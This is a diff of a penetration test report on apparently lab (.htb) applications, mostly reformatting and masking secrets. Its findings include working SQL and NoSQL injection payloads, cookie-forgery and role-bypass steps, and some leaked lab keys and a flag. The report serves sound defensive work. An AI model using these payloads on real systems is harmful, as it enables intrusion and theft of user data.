@@ -22,7 +22,7 @@
         * [Valid email enumeration via forgot-password self-service (michael@vitamedix.htb)](#5296e7d1-3552-4af2-8303-4f39f503ee54)
         * [Logic Flaw on Storage.vitamedix.htb → SMTP credentials leak](#a5772f07-ca79-4f30-9424-51762dbe1fc8)
         * [Email header injection (CRLF) in password reset](#d344076c-001e-4d19-acab-ec9e495fab71)
-        * [DNS.vitamedix:8006 Pi-hole password leak (WEBPASSWORD: pihole)](#0f92f352-828c-4b46-b853-6592beec8b3d)
+        * [DNS.vitamedix:8006 Pi-hole password leak (WEBPASSWORD: pih***)](#0f92f352-828c-4b46-b853-6592beec8b3d)
         * [NoSQL Injection in /api/validateToken www.vitamedix.htb](#aaa9d649-31b9-4592-992d-51182c427f73)
         * [DNS rebind => CSRF => Stored Cross-Site Scripting (XSS) => Admin cookie theft](#edb020c8-9ce8-4b17-9b9e-5f074ae0f552)
         * [PDF generation SSRF via DNS rebinder → internal CouchDB access](#b7b812b2-8457-49f0-8f78-f9935efd02e2)
@@ -166,7 +166,7 @@ The scope of this assessment was as follows:
 
 During the course of testing, The tester uncovered a total of 23 findings that pose a material risk to clients' web applications and systems. The below table provides a summary of the findings by severity level.
 
- 
+
 
 | Finding Severity |          |            |           |           |           |
 | ---------------- | -------- | ---------- | --------- | --------- | --------- |
@@ -183,23 +183,23 @@ Below is a high-level overview of each finding identified during the course of t
 | 2.    Leaked AUTH_SECRET → cookie forgery                                                        | **Critical**   | Leaked AUTH_SECRET         |
 | 3.    Role-upgrade bypass via parameter logic flaw (fookey)                                      | **High**       | Logic Flaw                 |
 | 4.    Leaked credentials charles:charles on forum.royalflush.htb                                 | **Medium**     | Leaked Credentials         |
-| 5.    No domain restriction at registration                                                       | **High**       | Logic Flaw                 |
+| 5.    No domain restriction at registration                                                      | **High**       | Logic Flaw                 |
 | 6.    NoSQL Injection at verify-email endpoint forum.royalflush.htb                              | **High**       | NoSQL Injection            |
-| 7.    Creds Leak at forum.royalflush.htb                                                        | **High**       | Information Disclosure     |
-| 8.    SQL Injection at Vault.royalflush.htb                                                       | **Critical**   | SQL INJECTION              |
-| 9.    .NET BinaryFormatter deserialization                                                        | **Critical**   | RCE                        |
-| 10.   LDAP injection at ldap.vitamedix.htb                                                        | **High**       | LDAP Injection             |
-| 11.   Valid email enumeration via forgot-password self-service (michael@vitamedix.htb)            | **Medium**     | Email Enumeration          |
+| 7.    Creds Leak at forum.royalflush.htb                                                         | **High**       | Information Disclosure     |
+| 8.    SQL Injection at Vault.royalflush.htb                                                      | **Critical**   | SQL INJECTION              |
+| 9.    .NET BinaryFormatter deserialization                                                       | **Critical**   | RCE                        |
+| 10.   LDAP injection at ldap.vitamedix.htb                                                       | **High**       | LDAP Injection             |
+| 11.   Valid email enumeration via forgot-password self-service (michael@vitamedix.htb)           | **Medium**     | Email Enumeration          |
 | 12.   Logic Flaw on Storage.vitamedix.htb → SMTP credentials leak                                | **High**       | Logic Flaw                 |
 | 13.   Email header injection (CRLF) in password reset                                            | **High**       | CRLF Injection             |
-| 14.   DNS.vitamedix:8006 Pi-hole password leak (WEBPASSWORD: pihole)                             | **Critical**   | Information Disclosure     |
+| 14.   DNS.vitamedix:8006 Pi-hole password leak (WEBPASSWORD: pih***)                             | **Critical**   | Information Disclosure     |
 | 15.   NoSQL Injection in /api/validateToken www.vitamedix.htb                                    | **High**       | NoSQL Injection            |
 | 16.   DNS rebind => CSRF => Stored Cross-Site Scripting (XSS) => Admin cookie theft              | **High**       | Cross-Site Scripting (XSS) |
 | 17.   PDF generation SSRF via DNS rebinder → internal CouchDB access                             | **Critical**   | DNS rebind                 |
 | 18.   RCE via eval on newsletter.vitamedix.htb                                                   | **Critical**   | RCE                        |
 | 19.   XPath injection in q parameter at query.php&home.php                                       | **High**       | XPath Injection            |
 | 20.   Race condition on admin_panel.php                                                          | **Medium**     | Race Condition             |
-| 21.   request smuggling Attack at securedata.htb                                                | **Medium**     | Request Smuggling          |
+| 21.   request smuggling Attack at securedata.htb                                                 | **Medium**     | Request Smuggling          |
 | 22.   XSS in http://securedata.htb/admin/admin_panel.php in CLIENT-IP header via Cache-poisoning | **High**       | XSS                        |
 | 23.   Remote Code Execution in http://api.securedata.htb/service_status?service=nginx            | **High**       | RCE                        |
 
@@ -239,7 +239,7 @@ VitaMedix contains a critical remote-code-execution weakness and several high-se
 * Valid email disclosure (Finding #11, Medium): Forgot-password response confirms michael@vitamedix.htb.
 * BOLA/IDOR on Storage.vitamedix.htb (Finding #12, High): render.php reads arbitrary file IDs from session without ownership checks, leaking SMTP credentials.
 * Email header injection (CRLF) (Finding #13, High): Allows header manipulation in password-reset emails.
-* Pi-hole password leak (Finding #14, Critical): WEBPASSWORD: pihole exposed for DNS.vitamedix:8006.
+* Pi-hole password leak (Finding #14, Critical): WEBPASSWORD: pih*** exposed for DNS.vitamedix:8006.
 * NoSQL Injection in verifyToken (Finding #15, High): Regex-based NoSQL injection leaks account-creation tokens.
 * Stored XSS (Finding #16, High): Payload stored in user settings executes in the admin browser.
 * PDF generation SSRF via DNS rebinder (Finding #17, Critical): Forces the PDF generator to fetch internal CouchDB content.
@@ -276,9 +276,9 @@ SecureData contained five findings, all rated High or lower.
 9. Remove default or weak credentials, enforce multi-factor authentication for privileged accounts, and rotate credentials regularly (Findings #4, #7).
 10. Conduct a source-code review to remove information disclosures such as internal URLs, stack traces, and verbose error messages from production responses.
 
-                                                                                                                                                                                             
-###### Remediation priority: Address all Critical and High findings immediately to prevent full application or infrastructure compromise. Medium and Low findings should be remediated in the  next maintenance cycle.                                                                                                                                                                 
-                               
+
+###### Remediation priority: Address all Critical and High findings immediately to prevent full application or infrastructure compromise. Medium and Low findings should be remediated in the  next maintenance cycle.
+
 
 
 ## Findings {#findings}
@@ -303,28 +303,28 @@ CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (9.3 - Critical)
 
 #### Description & Cause
 
-The /forgot password-reset endpoint is vulnerable to SQL Injection (CWE-89). User-supplied input is concatenated directly into a SQL query using Python string formatting, allowing an    
-   attacker to alter the intended query structure and execute arbitrary SQL commands against the PostgreSQL backend. Although an anti_sqli decorator is applied to the route, it relies on a 
+The /forgot password-reset endpoint is vulnerable to SQL Injection (CWE-89). User-supplied input is concatenated directly into a SQL query using Python string formatting, allowing an
+   attacker to alter the intended query structure and execute arbitrary SQL commands against the PostgreSQL backend. Although an anti_sqli decorator is applied to the route, it relies on a
    blacklist-based regular expression that is trivially bypassed, leaving the underlying injection vector exposed.
-   
-
-   #### Affected Endpoint                                                                                                                                                                                                                                                                                                               
-   • URL: /forgot                                                                                                                                                                            
-   • Method: POST                                                                                                                                                                            
-   • Parameter: email                                                                                                                                                                        
-   • File: www/__init__.py                                                                                                                                                               
-   • Line: 104 
 
 
-   The application constructs the user lookup query by interpolating the email form value directly into the SQL string:                                                                      
-                                                                                                                                                                                             
-   ```python                                                                                                                                                                                 
-     cursor.execute("SELECT user_id FROM users WHERE email = '%s'" % (email,))                                                                                                               
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
-   This approach trusts the raw user input to be a benign email address. Because the value is embedded inside the query string before it reaches the database driver or syntax supplied by the attacker are interpreted as part of the query itself.                                                                                                           
-                                                                                                                                                                                             
-   The route is decorated with @anti_sqli, but the implemented filter is a brittle blacklist that only blocks a narrow set of patterns and keywords. It does not enforce parameterized       
+   #### Affected Endpoint
+   • URL: /forgot
+   • Method: POST
+   • Parameter: email
+   • File: www/__init__.py
+   • Line: 104
+
+
+   The application constructs the user lookup query by interpolating the email form value directly into the SQL string:
+
+   ```python
+     cursor.execute("SELECT user_id FROM users WHERE email = '%s'" % (email,))
+   ```
+
+   This approach trusts the raw user input to be a benign email address. Because the value is embedded inside the query string before it reaches the database driver or syntax supplied by the attacker are interpreted as part of the query itself.
+
+   The route is decorated with @anti_sqli, but the implemented filter is a brittle blacklist that only blocks a narrow set of patterns and keywords. It does not enforce parameterized
    queries at the data-access layer and can be circumvented using alternative PostgreSQL syntax — for example, the string-concatenation operator || combined with time-delay functions such  as pg_sleep() — to infer data through blind boolean/time-based techniques.
 
 #### Security Impact
@@ -356,7 +356,7 @@ Within the primary application database (`royalflush`), the attacker can directl
 
 
 
-While reviewing `www/__init__.py`, The pentester identified an unauthenticated SQL injection vulnerability in the password reset (`/forgot`) endpoint. The backend constructs SQL queries using raw Python string formatting rather than parameterized statements:
+While reviewing `www/__init__.py`, The tester identified an unauthenticated SQL injection vulnerability in the password reset (`/forgot`) endpoint. The backend constructs SQL queries using raw Python string formatting rather than parameterized statements:
 
 
 
@@ -366,9 +366,9 @@ cursor.execute("SELECT user_id FROM users WHERE email = '%s'" % (email,))
 
 Because user input from the `email` field is directly concatenated into the query, an attacker can manipulate the query structure. Although the application attempts to filter malicious inputs using an `@anti_sqli` decorator, the filter relies on simple regex patterns that are easily bypassed using alternative PostgreSQL syntax.
 
-#### How We Confirmed It
+#### Verification
 
-We verified the flaw by issuing a time-based blind SQL injection payload in the `email` parameter:
+The tester verified the flaw by issuing a time-based blind SQL injection payload in the `email` parameter:
 
 **Payload submitted:**
 
@@ -388,13 +388,13 @@ SELECT user_id FROM users WHERE email = 'asd@me.c' || (SELECT pg_sleep(10)::text
 
 The database evaluated `pg_sleep(10)` during string concatenation, introducing an intentional 10-second delay in the server's response. This confirmed that injected SQL commands execute directly against the backend PostgreSQL database.
 
-![](assets/edited.png){width="auto"}
+![Screenshot](assets/edited.png)
 
-then the pentester created a script to dump usernames and email of users 
+then the tester created a script to dump usernames and email of users
 
 [www.royalflush.htb-forgot-SQLI.py](exploits/www.royalflush.htb-forgot-SQLI.py)
 
-this lead to dump of user data 
+this lead to dump of user data
 `chandler******:lbr***@hotmail.com
 `
 
@@ -432,7 +432,7 @@ def forgot():
     ...
     else:
         email = request.form.get('email', '').strip()
-        
+
         if email:
             with db.connect() as conn:
                 cursor = conn.cursor()
@@ -480,7 +480,7 @@ Monitor application logs for suspicious characters or payload structures. Establ
 
 #### 6. Retesting & Verification
 
-Following implementation of the patch, the pentester should re-run the original time-based exploitation scripts to verify that response times remain consistent and data extraction is no longer possible.
+Following implementation of the patch, the tester should re-run the original time-based exploitation scripts to verify that response times remain consistent and data extraction is no longer possible.
 
 
 
@@ -507,7 +507,7 @@ CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (9.3 - Critical)
 
 #### Finding: Hardcoded Secrets Exposed via Git Repository History
 
-During the repository analysis, the pentester discovered that the application’s full `.env` configuration file was committed in the initial Git commit. This file contained critical operational credentials, including database access passwords, keys used to sign Flask sessions, cookie authentication secrets, and administrative API keys.
+During the repository analysis, the tester discovered that the application’s full `.env` configuration file was committed in the initial Git commit. This file contained critical operational credentials, including database access passwords, keys used to sign Flask sessions, cookie authentication secrets, and administrative API keys.
 
 Although the `.env` file was modified or removed in subsequent commits, the original secrets remain fully accessible within the repository’s commit history.
 
@@ -568,7 +568,7 @@ With access to the leaked `.env` secrets, an attacker can exploit the applicatio
 
 During a review of the application source code and commit history, the complete `.env` configuration file was identified in the repository's initial commit. Although modified in subsequent commits, the initial commit remained accessible in Git history. This file contained operational secrets, including `AUTH_SECRET`, which is used by the application to sign user authentication cookies.
 
-![](assets/edited-VmwcSTyd.png){width="auto"}
+![VmwcSTyd](assets/edited-VmwcSTyd.png)
 
 #### Secret Extraction & Mechanism Analysis
 
@@ -607,7 +607,7 @@ When the forged cookie was set in the browser and applied to subsequent applicat
 * Full access was granted to user-restricted endpoints, including `/settings` and role-specific portal functionality.
 * Because the `expires_at` field within the payload is attacker-controlled, forged sessions can be set to remain valid indefinitely.
 
-![](assets/edited-DoLwKPVb.png){width="auto"}
+![DoLwKPVb](assets/edited-DoLwKPVb.png)
 
 
 #### Patching and Remediation
@@ -646,9 +646,7 @@ When the forged cookie was set in the browser and applied to subsequent applicat
 
 Use `git-filter-repo` or BFG Repo-Cleaner to strip the `.env` file from all commits:
 
-Bash
-
-```
+```bash
 # Install git-filter-repo
 pip install git-filter-repo
 
@@ -715,9 +713,7 @@ If rewriting history is not feasible, rotate the secrets and add monitoring. Acc
 
 * **Audit Repository for Additional Leaks:**
 
-  Bash
-
-  ```
+  ```bash
   trufflehog filesystem /path/to/repo
   # or
   gitleaks detect --source /path/to/repo
@@ -739,9 +735,7 @@ If rewriting history is not feasible, rotate the secrets and add monitoring. Acc
 
 After applying patches, run:
 
-Bash
-
-```
+```bash
 git ls-files | grep .env
 ```
 
@@ -783,23 +777,21 @@ An unauthorized attacker can exploit this discrepancy by passing a parameter nam
 
 Located in `www/__init__.py:36-47`:
 
-Python
-
-```
+```python
 def api_key_required(f):
     @wraps(f)
     def decorator(*args, **kwargs):
         if 'key=' not in request.query_string.decode():
             return "Forbidden: Missing API key (parameter 'key')", 403
-            
+
         api_key = request.args.get('key')
-        
+
         if api_key == "":
             return "Forbidden: Empty API key", 403
-            
+
         if api_key and api_key != os.getenv('API_SECRET'):
             return "Forbidden: Incorrect API key", 403
-            
+
         return f(*args, **kwargs)
     return decorator
 ```
@@ -890,11 +882,11 @@ UPDATE user_roles SET role_id = 2 WHERE user_id = <attacker_user_id>
 
 The targeted account was successfully promoted to administrator (`role_id = 2`). Upon refreshing the session, the `/admin` dashboard became fully accessible, exposing the entire user directory and revealing the `admin_secret`.
 
-![](assets/Screenshot-from-2026-08-08-22-22-12.png){width="auto"}
+![08 22 22 12](assets/Screenshot-from-2026-08-08-22-22-12.png)
 
                                                               flag `da3d97b0bc320ac2197b3dd03b6f292a`
 
-![](assets/edited-u2COwBHK.png){width="auto"}
+![u2COwBHK](assets/edited-u2COwBHK.png)
 
 
 #### Patching and Remediation
@@ -934,15 +926,15 @@ The endpoint must verify that the caller is logged in and has administrative pri
 def api_changeUserRole():
     user_id = request.form.get('user_id')
     role_id = request.form.get('role_id')
-    
+
     if not user_id or not role_id:
         return "Missing parameters", 400
-        
+
     with db.connect() as conn:
         cursor = conn.cursor()
         cursor.execute('UPDATE user_roles SET role_id = %s WHERE user_id = %s', (role_id, user_id))
         conn.commit()
-        
+
     return "OK"
 ```
 
@@ -1001,15 +993,15 @@ The same authentication bypass affects multiple endpoints:
 def api_changeUsername():
     new_username = request.form.get('username')
     token = auth.parse_token(request.cookies.get(auth.cookie_name))
-    
+
     if not new_username:
         return "Missing username parameter", 400
-        
+
     with db.connect() as conn:
         cursor = conn.cursor()
         cursor.execute('UPDATE users SET username = %s WHERE email = %s', (new_username, token['email']))
         conn.commit()
-        
+
     return "OK"
 ```
 
@@ -1070,7 +1062,7 @@ Based on the explicit disclosure in the public forum thread, the target credenti
 * **Username:** `char****`
 * **Password:** `char***`
 
-![](assets/edited-u7it1eUq.png){width="auto"}
+![u7it1eUq](assets/edited-u7it1eUq.png)
 #### Exploitation & Verification
 
 1. Navigated to the primary RoyalFlush login portal at `[https://www.royalflush.htb/login](https://www.royalflush.htb/login)`.
@@ -1110,9 +1102,7 @@ Based on the explicit disclosure in the public forum thread, the target credenti
 
 4. **Enforce Strong Password Policies:** Update registration and password-reset controllers to strictly reject weak or predictable input, including passwords matching the username or common dictionary entries.
 
-   Python
-
-   ```
+   ```python
    import re
 
    def is_password_strong(username, password):
@@ -1154,9 +1144,7 @@ Based on the explicit disclosure in the public forum thread, the target credenti
 
 7. **Implement Login Rate Limiting:** Thwart automated credential-stuffing and brute-force attacks by enforcing rate limiting at the API gateway or application layer.
 
-   Python
-
-   ```
+   ```python
    # Example implementation using Flask-Limiter
    from flask_limiter import Limiter
 
@@ -1264,17 +1252,17 @@ While `handleCreateAccount` generates a verification token and `handleLogin` che
 
 #### Source-Code Review
 
-While reviewing the forum source code at `/home/hassan/Desktop/code/forum-main/forum`, the pentester examined the account-registration flow in `app/Http/Controllers/AuthController.php` and the staff-check logic in `app/Services/AuthService.php`.
+While reviewing the forum source code at `/home/hassan/Desktop/code/forum-main/forum`, the tester examined the account-registration flow in `app/Http/Controllers/AuthController.php` and the staff-check logic in `app/Services/AuthService.php`.
 
 
-The pentester observed that:
+The tester observed that:
 
 1. The registration handler accepts any email address without validating the domain.
 2. The `isUserStaff()` function grants staff privileges automatically when the email domain is `royalflush.htb`.
 
 #### Exploitation
 
-To confirm the flaw, the pentester navigated to the forum registration page at `[http://forum.royalflush.htb/create-account](http://forum.royalflush.htb/create-account)` and submitted the following registration form:
+To confirm the flaw, the tester navigated to the forum registration page at `[http://forum.royalflush.htb/create-account](http://forum.royalflush.htb/create-account)` and submitted the following registration form:
 
 | **Field**           | **Value**                 |
 | ------------------- | ------------------------- |
@@ -1285,15 +1273,13 @@ To confirm the flaw, the pentester navigated to the forum registration page at `
 
 The application processed the request and created the account successfully:
 
-![](assets/edited-svnmKRhJ.png){width="auto"}
+![svnmKRhJ](assets/edited-svnmKRhJ.png)
 
 #### Verification of Staff Status
 
 After completing the email-verification step and logging in with the newly created account, the application executed the login handler:
 
-PHP
-
-```
+```php
 // app/Http/Controllers/AuthController.php:128-134
 session([
     'userId' => $user['id'],
@@ -1352,9 +1338,7 @@ Do not allow public self-registration for staff accounts under any condition. Im
 
 Enforce native Laravel validation rules at the entry point of `handleCreateAccount` to harden input handling:
 
-PHP
-
-```
+```php
 $request->validate([
     'username' => 'required|unique:users,username|max:50',
     'email'    => 'required|email|unique:users,email',
@@ -1410,8 +1394,8 @@ Cause
 The root cause is unsafe construction of a MongoDB \$where query using sprintf() with raw user input:
 
 ```php
-  $where = sprintf("return this.token == '%s' && this.userId == '%s'", $token, $user['id']);                                                                                              
-  $verificationToken = $verificationTokens_collection->findOne(['$where' => $where]);                                                                                                     
+  $where = sprintf("return this.token == '%s' && this.userId == '%s'", $token, $user['id']);
+  $verificationToken = $verificationTokens_collection->findOne(['$where' => $where]);
 ```
 
 The application treats token and email as trusted string literals rather than untrusted data. MongoDB's \$where operator executes the supplied string as JavaScript in the database context.
@@ -1425,11 +1409,9 @@ The application treats token and email as trusted string literals rather than un
 
 #### 1. Source-Code Review
 
-While reviewing `app/Http/Controllers/AuthController.php`, the pentester noticed that `showVerifyEmail()` builds a MongoDB `$where` query by concatenating the user-supplied `token` and `email` values directly into a JavaScript expression:
+While reviewing `app/Http/Controllers/AuthController.php`, the tester noticed that `showVerifyEmail()` builds a MongoDB `$where` query by concatenating the user-supplied `token` and `email` values directly into a JavaScript expression:
 
-PHP
-
-```
+```php
 $where = sprintf("return this.token == '%s' && this.userId == '%s'", $token, $user['id']);
 $verificationToken = $verificationTokens_collection->findOne(['$where' => $where]);
 ```
@@ -1438,7 +1420,7 @@ Because `$where` executes the string as JavaScript inside MongoDB, any injected 
 
 #### 2. Account Creation
 
-The pentester registered a new account with an email address under the `royalflush.htb` domain, for example:
+The tester registered a new account with an email address under the `royalflush.htb` domain, for example:
 
 Plaintext
 
@@ -1450,7 +1432,7 @@ asd@royalflush.htb
 
 #### 3. Malicious Verification Request
 
-Without using the legitimate verification token sent by email, the pentester sent the following request:
+Without using the legitimate verification token sent by email, the tester sent the following request:
 
 HTTP
 
@@ -1461,17 +1443,13 @@ Host: royalflush.htb
 
 The injected token transforms the `$where` expression from:
 
-JavaScript
-
-```
+```javascript
 return this.token == '<token>' && this.userId == '<userId>'
 ```
 
 into:
 
-JavaScript
-
-```
+```javascript
 return this.token == ''||true||''=='' && this.userId == '<userId>'
 ```
 
@@ -1484,9 +1462,9 @@ The application responded with the success message:
 > *"Thank you, your email has been successfully verified
 
 
-![](assets/edited-4jinfVYr.png){width="auto"}
+![4jinfVYr](assets/edited-4jinfVYr.png)
 
-The pentester could now log in to the activated account. Because the email domain was `@royalflush.htb`, the session was created with `isStaff = true`, granting access to staff-only forums and staff-only content across the application.
+The tester could now log in to the activated account. Because the email domain was `@royalflush.htb`, the session was created with `isStaff = true`, granting access to staff-only forums and staff-only content across the application.
 
 
 #### Patching and Remediation
@@ -1526,7 +1504,7 @@ public function showVerifyEmail(Request $request)
 
         session()->flash('status', 'Thank you, your email has been successfully verified');
         session()->flash('statusType', 'success');
-        
+
         return view('verify-email');
     }
 
@@ -1537,7 +1515,7 @@ private function invalidVerification()
 {
     session()->flash('status', 'Invalid or expired verification link');
     session()->flash('statusType', 'danger');
-    
+
     return view('verify-email');
 }
 ```
@@ -1605,9 +1583,7 @@ The issue is not that regular users can view the threads—the threads are prope
 
    `AuthController::handleLostPassword()` generates a random password, but the `mail()` call is commented out. As a result, the password is never delivered securely to the user's email:
 
-   PHP
-
-   ```
+   ```php
    try {
        // mail(
        //     $user['email'],
@@ -1627,9 +1603,7 @@ The issue is not that regular users can view the threads—the threads are prope
 
    `ThreadController::handlePost()` accepts the `content` parameter and saves it directly into a new `Post` document without inspecting it for patterns such as passwords, API keys, email addresses, or tokens:
 
-   PHP
-
-   ```
+   ```php
    $content = $request->input('content');
    $post = new Post();
    $post['threadId'] = $id;
@@ -1661,12 +1635,14 @@ Plaintext
 john: Like the question says, how can I access the team slack? I got logged out and realized I don't remember the password lul
 admin: The password is in Vault.
 john: Ahhhh okay.. what if I don't remember my password for vault either?
-admin: Mmmm alright, I'll have will change your password![](assets/Screenshot-from-2026-08-08-18-58-23.png){width="auto"}
+admin: Mmmm alright, I'll have will change your password
+
+![08 18 58 23](assets/Screenshot-from-2026-08-08-18-58-23.png)
 will: Hi John! I just reset you password to `42zyTJ94BwdKjEw******`. Your email is still the same one as here. Make sure you change it once you log in.
 john: Thx, will do <3
 ```
 
-![](assets/edited-APokibAN.png){width="auto"}
+![APokibAN](assets/edited-APokibAN.png)
 
 
 #### 2. Collecting Leaked Credentials
@@ -1690,7 +1666,7 @@ roverturbo: Ok I messaged you
 ```
 
 
-![](assets/edited-IdDwVJ73.png){width="auto"}
+![IdDwVJ73](assets/edited-IdDwVJ73.png)
 
 From the Discord handle `jdov****#0066`, infer the username `jdov****` and construct the associated corporate email address:
 
@@ -1716,43 +1692,43 @@ The application accepts the credentials, granting full access to the vault under
 
 #### Patching and Remediation
 
-1. Fix and enable secure password reset delivery                                                                                                                                          
-      Do not share plaintext passwords in forum threads. Uncomment and properly configure the mail() call in AuthController::handleLostPassword(), or better, use Laravel's Mail facade with 
-      a proper mail driver:                                                                                                                                                                  
-                                                                                                                                                                                             
-      ```php                                                                                                                                                                                 
-        use Illuminate\Support\Facades\Mail;                                                                                                                                                 
-        use App\Mail\PasswordResetMail;                                                                                                                                                      
-                                                                                                                                                                                             
-        $newPassword = AuthService::generateRandomString(16);                                                                                                                                
-        $newPasswordHash = password_hash($newPassword, PASSWORD_BCRYPT);                                                                                                                     
-        $user->update(['password' => $newPasswordHash]);                                                                                                                                     
-                                                                                                                                                                                             
-        Mail::to($user->email)->send(new PasswordResetMail($newPassword));                                                                                                                   
-      ```                                                                                                                                                                                    
-                                                                                                                                                                                             
-      Alternatively, switch to a time-limited, single-use password reset link instead of emailing a plaintext temporary password.                                                            
-                                                                                                                                                                                             
-   2. Use password reset tokens instead of plaintext passwords                                                                                                                               
-      Generate a cryptographically random token, store its hash in the database with an expiration timestamp, and email the user a link such as:                                             
-                                                                                                                                                                                             
-      ```                                                                                                                                                                                    
-        https://forum.royalflush.htb/reset-password?token=<random_token>                                                                                                                     
-      ```                                                                                                                                                                                    
-                                                                                                                                                                                             
-      This removes the need for staff to ever see or transmit a user's password.                                                                                                             
-                                                                                                                                                                                             
-   3. Create a secure support channel for sensitive requests                                                                                                                                 
-      Do not handle password resets in shared staff threads. Implement a private ticket system, direct-message feature, or out-of-band communication workflow (e.g., verified email or       
-      internal chat) where only the affected user and the assigned staff member can view the sensitive details.                                                                              
-                                                                                                                                                                                                                                                                                    
-   4. Enforce password change on first login                                                                                                                                                 
-      If a temporary password must be issued, set a flag forcing the user to change it immediately upon login. Store the flag in the user record and redirect to a password-change form      
-      before allowing normal use.                                                                                                                                                                                                                                                                                                                         
-                                                                                                                                                                                             
-   5. Monitor and audit staff threads                                                                                                                                                        
-      Implement logging and alerting for posts containing potential secrets. Regularly audit staff-only threads for exposed credentials and rotate any leaked credentials immediately.       
- 
+1. Fix and enable secure password reset delivery
+      Do not share plaintext passwords in forum threads. Uncomment and properly configure the mail() call in AuthController::handleLostPassword(), or better, use Laravel's Mail facade with
+      a proper mail driver:
+
+      ```php
+        use Illuminate\Support\Facades\Mail;
+        use App\Mail\PasswordResetMail;
+
+        $newPassword = AuthService::generateRandomString(16);
+        $newPasswordHash = password_hash($newPassword, PASSWORD_BCRYPT);
+        $user->update(['password' => $newPasswordHash]);
+
+        Mail::to($user->email)->send(new PasswordResetMail($newPassword));
+      ```
+
+      Alternatively, switch to a time-limited, single-use password reset link instead of emailing a plaintext temporary password.
+
+   2. Use password reset tokens instead of plaintext passwords
+      Generate a cryptographically random token, store its hash in the database with an expiration timestamp, and email the user a link such as:
+
+      ```
+        https://forum.royalflush.htb/reset-password?token=<random_token>
+      ```
+
+      This removes the need for staff to ever see or transmit a user's password.
+
+   3. Create a secure support channel for sensitive requests
+      Do not handle password resets in shared staff threads. Implement a private ticket system, direct-message feature, or out-of-band communication workflow (e.g., verified email or
+      internal chat) where only the affected user and the assigned staff member can view the sensitive details.
+
+   4. Enforce password change on first login
+      If a temporary password must be issued, set a flag forcing the user to change it immediately upon login. Store the flag in the user record and redirect to a password-change form
+      before allowing normal use.
+
+   5. Monitor and audit staff threads
+      Implement logging and alerting for posts containing potential secrets. Regularly audit staff-only threads for exposed credentials and rotate any leaked credentials immediately.
+
 
 
 
@@ -1788,7 +1764,7 @@ The root cause is unsafe dynamic SQL construction combined with ineffective inpu
 
    In `MyController.SecondaryEmail()`, the secondary email value is embedded directly into the query string:
 
-  
+
 
    ```C#
    cmd.CommandText = string.Format("SELECT * FROM Users WHERE Email = '{0}' OR SecondaryEmail = '{0}'", secondaryEmail);
@@ -1800,7 +1776,7 @@ The root cause is unsafe dynamic SQL construction combined with ineffective inpu
 
    The validation pattern is configured as:
 
-  
+
 
    ``` C#
    string emailPattern = @"\S+@[a-z\.]+";
@@ -1823,7 +1799,7 @@ The SQL injection in `/My/SecondaryEmail` runs in the context of Microsoft SQL S
 
 * **Database extraction** The attacker can dump the entire Vault database, including all user records, password hashes, and the contents of the Passwords table. This exposes every secret the application is meant to protect.
 * **System file read** Through `OPENROWSET(BULK...)` and error-based file probing, the attacker can read arbitrary files from the web server. In this case, the `Web.config` file was successfully extracted.
-* **Authentication bypass via forged JWT cookies** The dumped `Web.config` contains the `AuthKey` value `874c2f91-7346-4005-b55d-5077a54a5201`, which is used by `AuthService` as the symmetric signing key for JWT authentication cookies. With this key, an attacker can forge valid user cookies for any account, including administrators, without needing a password.
+* **Authentication bypass via forged JWT cookies** The dumped `Web.config` contains the `AuthKey` value `874c2f91-7346-4005-****-*******`, which is used by `AuthService` as the symmetric signing key for JWT authentication cookies. With this key, an attacker can forge valid user cookies for any account, including administrators, without needing a password.
 * **Decryption of stored passwords** The same `Web.config` exposes `PasswordKey` (`f3d9aa53-c08d-43`) and `PasswordIV` (`5ac8083e-8ff6-43`), which are used by `PasswordService` to encrypt and decrypt password entries. An attacker with these values can decrypt every stored password in the Passwords table, exposing all user-managed secrets in plaintext.
 * **Lateral movement** Credentials and configuration details extracted from the vault can be reused against other internal services, such as the forum, database server, or any other application sharing the same identity or infrastructure.
 
@@ -1832,9 +1808,9 @@ The SQL injection in `/My/SecondaryEmail` runs in the context of Microsoft SQL S
 
 1. **Source-code review**
 
-   While reviewing `Controllers/MyController.cs`, the pentester identified the vulnerable query in the `SecondaryEmail()` action:
+   While reviewing `Controllers/MyController.cs`, the tester identified the vulnerable query in the `SecondaryEmail()` action:
 
-   
+
 
    ```C#
    cmd.CommandText = string.Format("SELECT * FROM Users WHERE Email = '{0}' OR SecondaryEmail = '{0}'", secondaryEmail);
@@ -1844,9 +1820,9 @@ The SQL injection in `/My/SecondaryEmail` runs in the context of Microsoft SQL S
 
 2. **Confirming error-based boolean injection**
 
-   The pentester submitted a payload designed to trigger a divide-by-zero error when the injected condition is true:
+   The tester submitted a payload designed to trigger a divide-by-zero error when the injected condition is true:
 
-   
+
 
    ```HTTP
    secondaryEmail=asd@me.com'UNION+SELECT+NULL,NULL,NULL,+CASE+WHEN+(1=1)+THEN+1/0+ELSE+NULL+END;--+-
@@ -1854,11 +1830,11 @@ The SQL injection in `/My/SecondaryEmail` runs in the context of Microsoft SQL S
 
    The server responded with a `Divide by zero error encountered` message, proving the injected SQL was executed and the fourth column was processed.
 
-![](assets/edited-88cFsBdW.png){width="auto"}
+![88cFsBdW](assets/edited-88cFsBdW.png)
 
-   To confirm the injection was conditional, the pentester changed the condition to `1=2`:
+   To confirm the injection was conditional, the tester changed the condition to `1=2`:
 
-   
+
 
    ```HTTP
    secondaryEmail=asd@me.com'UNION+SELECT+NULL,NULL,NULL,+CASE+WHEN+(1=2)+THEN+1/0+ELSE+NULL+END;--+-
@@ -1866,7 +1842,9 @@ The SQL injection in `/My/SecondaryEmail` runs in the context of Microsoft SQL S
 
    This time the server returned a normal `302 redirect` with no error, showing the condition controlled query behavior.
 
-   ![](assets/edited-PgZu2fQ4.png){width="auto"}
+   
+
+![PgZu2fQ4](assets/edited-PgZu2fQ4.png)
 
 3. **Extracting internal paths from error messages**
 
@@ -1878,39 +1856,39 @@ The SQL injection in `/My/SecondaryEmail` runs in the context of Microsoft SQL S
    C:\inetpub\wwwroot\vault.royalflush.htb\Controllers\MyController.cs:192
    ```
 
-![](assets/edited-lUlRGkHi.png){width="auto"}
+![lUlRGkHi](assets/edited-lUlRGkHi.png)
 
 
    This confirmed the application was running under IIS in `C:\inetpub\wwwroot\vault.royalflush.htb\`.
 
 4. **Mapping file existence through SQL Server bulk-load errors**
 
